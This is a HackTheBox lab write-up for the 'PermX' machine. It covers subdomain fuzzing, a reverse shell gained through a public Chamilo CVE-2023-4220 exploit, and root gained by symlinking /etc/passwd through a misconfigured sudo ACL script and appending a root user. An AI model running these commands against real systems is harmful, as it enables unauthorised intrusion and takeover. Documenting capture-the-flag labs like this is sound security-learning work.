---
title: PermX
tags:
  - Linux
  - Chamilo
  - CVE
  - Symlinks
  - HackTheBox
  - Easy
date: 2024-07-01T00:00:00Z
---
![](Pasted%20image%2020240901125933.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts
```

Then I performed an Nmap scan:

```shell
nmap -sC -T4 -p- permx.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http
|_http-title: eLEARNING
```

So let's inspect the webpage:

![](Pasted%20image%2020240901130310.png)

After inspecting the source code, I decided to perform a [dirsearch 📁](/notes/tools/dirsearch.md) scan. I didn't find anything, so I decided to perform a [Ffuf 🐳](/notes/tools/Ffuf.md) domain scan:

```shell
ffuf -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -fc 302

[redacted]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 54ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 84ms]
```

>[!Note]
>*The `-fc` option is to filter by status codes*

I added the new subdomains to my known hosts and took a look at them:

![](Pasted%20image%2020240901131442.png)

A Free Software Learning Management system was found, **Chamilo**. 

## Weaponization

I found this script: [CVE-2023-4220](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)

## Exploitation

Once cloned, I used the script like:

```shell
python3 main.py -u http://lms.permx.htb -a revshell
```

>We've got a shell :D

![](Pasted%20image%2020240901132756.png)

Stabilize the shell with:

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
# then
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

Unfortunately, we've got no read permissions on user's home. So now I uploaded linpeas to gather information. I found the user's `mtz` password:

![](Pasted%20image%2020240901134117.png)

> So I connected through ssh and got the user flag :D

![](Pasted%20image%2020240901134211.png)

## Privilege Escalation

If we run linpeas again, we found the following:

![](Pasted%20image%2020240901134630.png)

If we run `sudo -l`:

![](Pasted%20image%2020240901134929.png)

Let's inspect that script:

![](Pasted%20image%2020240901135000.png)

This script allows us to set specific permissions on a specific file for a given user, but:
- The file path must be under `/home/mtz/`
- The file path cannot contain directory traversal symbols `..`

So, what we can do here is to create a symbolic link to the `/etc/passwd` file in the `/home/mtz` directory. Then edit the file to add a privileged user:

- Generate a password hash (in your machine):

```shell
openssl passwd gitblanc

$1$f38cgIRL$X1QP8m/e8ew.xshFc8Vd9/
```

- Escalate:

```shell
ln -s /etc/passwd passwd # create the symbolic link
sudo /opt/acl.sh mtz rwx /home/mtz/passwd
echo 'gitblanc:$1$f38cgIRL$X1QP8m/e8ew.xshFc8Vd9/:0:0:root:/root:/bin/bash' >> /home/mtz/passwd
```

- Check the passwd file to confirm that the new privileged user exists:

![](Pasted%20image%2020240901140110.png)

> Now just login as the new user: `gitblanc:gitblanc`, and got the root flag

![](Pasted%20image%2020240901140819.png)

==Machine pwned!==
